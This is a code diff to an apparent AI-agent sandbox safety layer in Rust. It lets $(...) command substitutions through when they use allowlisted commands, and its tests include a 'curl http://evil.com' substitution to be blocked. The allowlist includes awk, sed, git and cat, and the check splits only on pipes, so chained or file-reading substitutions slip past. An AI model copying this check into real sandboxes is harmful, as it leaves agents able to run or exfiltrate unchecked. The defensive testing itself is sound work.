@@ -8,6 +8,20 @@ use astra_sandbox::{CommandRisk, analyze_command_risks};
 const DESTRUCTIVE_KEYWORDS: &[&str] = &["DROP", "DELETE", "TRUNCATE", "ALTER", "GRANT", "REVOKE"];
 const SHELL_EXECUTION_TOOLS: &[&str] = &["bash", "exec", "run_command", "shell"];
 
+/// Safe commands that can be used inside command substitution `$(...)`.
+/// These commands only read state and don't have dangerous side effects.
+const SAFE_SUBST_COMMANDS: &[&str] = &[
+    // Path/file info
+    "basename", "dirname", "readlink", "realpath", "pwd", // Command location
+    "which", "command", "type", // Date/time
+    "date", // Text processing (read-only)
+    "cat", "head", "tail", "wc", "cut", "tr", "sort", "uniq", "grep", "awk", "sed",
+    // Variable expansion
+    "echo", "printf", // Other read-only
+    "id", "whoami", "hostname", "uname", "arch", "nproc", // Git (read-only)
+    "git",
+];
+
 /// Zsh-specific dangerous commands that can bypass security checks.
 /// These commands allow arbitrary file I/O, network access, or code execution
 /// without going through standard binaries that we can validate.
@@ -494,9 +508,25 @@ fn shell_command_uses_dynamic_eval(command: &str) -> bool {
 }
 
 fn check_command_substitution(command: &str) -> bool {
+    // Check for backticks first - always considered unsafe
+    if has_unquoted_backticks(command) {
+        return true;
+    }
+
+    // Extract all $(...) substitutions and check if they use safe commands
+    for subst in extract_command_substitutions(command) {
+        if !is_safe_command_substitution(&subst) {
+            return true;
+        }
+    }
+
+    false
+}
+
+/// Check if command has backticks outside of single quotes
+fn has_unquoted_backticks(command: &str) -> bool {
     let chars: Vec<char> = command.chars().collect();
     let mut in_single_quote = false;
-    let mut in_double_quote = false;
     let mut i = 0usize;
 
     while i < chars.len() {
@@ -505,28 +535,100 @@ fn check_command_substitution(command: &str) -> bool {
             i += 2;
             continue;
         }
-        if ch == '\'' && !in_double_quote {
+        if ch == '\'' {
             in_single_quote = !in_single_quote;
             i += 1;
             continue;
         }
-        if ch == '"' && !in_single_quote {
-            in_double_quote = !in_double_quote;
-            i += 1;
-            continue;
-        }
-        if !in_single_quote {
-            if ch == '$' && chars.get(i + 1) == Some(&'(') && chars.get(i + 2) != Some(&'(') {
-                return true;
-            }
-            if ch == '`' {
-                return true;
-            }
+        if !in_single_quote && ch == '`' {
+            return true;
         }
         i += 1;
     }
-
     false
+}
+
+/// Extract the contents of all $(...) command substitutions (not nested)
+fn extract_command_substitutions(command: &str) -> Vec<String> {
+    let mut results = Vec::new();
+    let chars: Vec<char> = command.chars().collect();
+    let mut in_single_quote = false;
+    let mut i = 0usize;
+
+    while i < chars.len() {
+        let ch = chars[i];
+        if ch == '\\' && !in_single_quote {
+            i += 2;
+            continue;
+        }
+        if ch == '\'' {
+            in_single_quote = !in_single_quote;
+            i += 1;
+            continue;
+        }
+
+        // Found $( but not $(( (arithmetic)
+        if !in_single_quote
+            && ch == '$'
+            && chars.get(i + 1) == Some(&'(')
+            && chars.get(i + 2) != Some(&'(')
+        {
+            // Extract content between $( and matching )
+            let start = i + 2;
+            let mut depth = 1;
+            let mut j = start;
+            while j < chars.len() && depth > 0 {
+                match chars[j] {
+                    '(' => depth += 1,
+                    ')' => depth -= 1,
+                    '\\' => {
+                        j += 1;
+                    } // skip next char
+                    _ => {}
+                }
+                j += 1;
+            }
+            if depth == 0 {
+                let content: String = chars[start..j - 1].iter().collect();
+                results.push(content);
+            }
+            i = j;
+            continue;
+        }
+
+        i += 1;
+    }
+
+    results
+}
+
+/// Check if a command substitution uses only safe commands
+fn is_safe_command_substitution(content: &str) -> bool {
+    // Get the first token (the command name)
+    let trimmed = content.trim();
+
+    // Handle pipelines - check first command of each segment
+    for segment in trimmed.split('|') {
+        let segment = segment.trim();
+        if segment.is_empty() {
+            continue;
+        }
+
+        // Extract first word (command name)
+        let first_word = segment
+            .split(|c: char| c.is_whitespace())
+            .next()
+            .unwrap_or("");
+
+        // Get basename (handle /usr/bin/grep → grep)
+        let cmd_name = first_word.rsplit('/').next().unwrap_or(first_word);
+
+        if !SAFE_SUBST_COMMANDS.contains(&cmd_name) {
+            return false;
+        }
+    }
+
+    true
 }
 
 fn check_inline_interpreter_exec(command: &str) -> Option<String> {
@@ -1532,9 +1634,12 @@ mod tests {
     }
 
     #[test]
-    fn middleware_blocks_command_substitution() {
-        let decision =
-            evaluate_tool_safety_request("bash", &json!({"command": "echo $(cat /etc/passwd)"}));
+    fn middleware_blocks_unsafe_command_substitution() {
+        // curl is not in the safe whitelist
+        let decision = evaluate_tool_safety_request(
+            "bash",
+            &json!({"command": "echo $(curl http://evil.com)"}),
+        );
         assert!(matches!(
             decision,
             SafetyMiddlewareDecision::Deny(reason)
@@ -1543,9 +1648,40 @@ mod tests {
     }
 
     #[test]
+    fn middleware_allows_safe_command_substitution() {
+        // grep is in the safe whitelist
+        let decision = evaluate_tool_safety_request(
+            "bash",
+            &json!({"command": r#"deps=$(grep "astra-" Cargo.toml | wc -l); echo $deps"#}),
+        );
+        assert_eq!(decision, SafetyMiddlewareDecision::Allow);
+    }
+
+    #[test]
+    fn middleware_allows_date_pwd_substitution() {
+        // date and pwd are in the safe whitelist
+        let decision = evaluate_tool_safety_request(
+            "bash",
+            &json!({"command": r#"echo "Today is $(date) in $(pwd)""#}),
+        );
+        assert_eq!(decision, SafetyMiddlewareDecision::Allow);
+    }
+
+    #[test]
+    fn middleware_allows_for_loop_with_safe_subst() {
+        // for loop with grep is common and safe
+        let decision = evaluate_tool_safety_request(
+            "bash",
+            &json!({"command": r#"for f in *.rs; do lines=$(wc -l < "$f"); echo "$f: $lines"; done"#}),
+        );
+        assert_eq!(decision, SafetyMiddlewareDecision::Allow);
+    }
+
+    #[test]
     fn middleware_blocks_backtick_command_substitution() {
+        // Backticks are always blocked regardless of command
         let decision =
-            evaluate_tool_safety_request("bash", &json!({"command": "echo `cat /etc/passwd`"}));
+            evaluate_tool_safety_request("bash", &json!({"command": "echo `cat file.txt`"}));
         assert!(matches!(
             decision,
             SafetyMiddlewareDecision::Deny(reason)
